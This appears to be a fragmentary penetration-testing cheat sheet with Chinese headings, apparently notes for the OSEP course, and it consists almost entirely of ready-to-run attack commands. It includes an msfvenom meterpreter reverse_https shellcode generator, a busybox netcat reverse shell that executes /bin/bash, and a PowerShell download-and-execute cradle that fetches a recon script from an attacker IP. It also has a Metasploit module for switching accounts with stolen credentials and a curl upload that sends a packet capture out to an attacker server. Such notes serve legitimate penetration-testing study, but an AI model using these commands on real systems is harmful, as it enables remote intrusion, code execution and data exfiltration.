...
- C# Shellcode
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.166 LPORT=443 -f csharp
```
...
```
```
busybox+nc+172.16.2.1+443+-e+/bin/bash
```
### netcat bind shell
- Kali
```
...
# Metasploit指令
>[!note]
>收集Metasploit常用的Module指令
### run_as_psh
>[!warning]
>拿到帳號密碼後，可以用這個module直接切換帳號

https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/run_as_psh.md
...
### HostRecon
>[!warning]
>OSEP Combining the Pieces
``` powershell
(new-object system.net.webclient).downloadstring('http://192.168.45.173/HostRecon.ps1') | IEX
```
...
class Handler(BaseHTTPRequestHandler):
    def do_PUT(self):
        filename = self.path.lstrip("/") or "upload.bin"
...
- 利用curl 上傳到python server
```
curl -T /tmp/troubleshooting_sar2html.pcap http://172.16.2.1
```
## 一鍵開啟FTP server
```
